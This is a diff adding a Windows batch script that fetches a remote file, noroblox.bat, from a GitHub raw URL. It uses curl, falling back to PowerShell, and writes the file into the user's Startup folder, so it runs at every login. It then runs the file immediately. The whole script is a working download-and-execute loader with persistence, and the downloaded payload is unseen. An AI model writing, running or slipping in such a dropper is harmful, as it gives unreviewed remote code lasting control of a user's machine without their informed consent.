@@ -1,1 +1,33 @@
+@echo off
+:: Set variables
+set "url=https://raw.githubusercontent.com/Zombro01/blob.../refs/heads/main/noroblox.bat"
+set "output_file=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\noroblox.bat"
+set "temp_file=%temp%\download_complete.tmp"
 
+:: Remove any previous temp file
+if exist "%temp_file%" del "%temp_file%"
+
+:: Check if curl is available
+where curl >nul 2>&1
+if not errorlevel 1 (
+    :: Use curl to download the file to the startup folder
+    curl -o "%output_file%" "%url%" && echo Download complete > "%temp_file%"
+    goto done
+)
+
+:: Fallback to PowerShell if curl is not available
+powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%output_file%'"
+echo Download complete > "%temp_file%"
+
+:done
+:: Check if the file has been downloaded successfully using the temp file as a flag
+if exist "%temp_file%" (
+    del "%temp_file%"  :: Clean up the temp file
+    echo Running in new terminal...
+    start cmd /c "%output_file%"
+) else (
+    echo Error: File did not download successfully.
+)
+
+echo Batch file created and executed in a new terminal from Startup folder as %output_file%
+pause
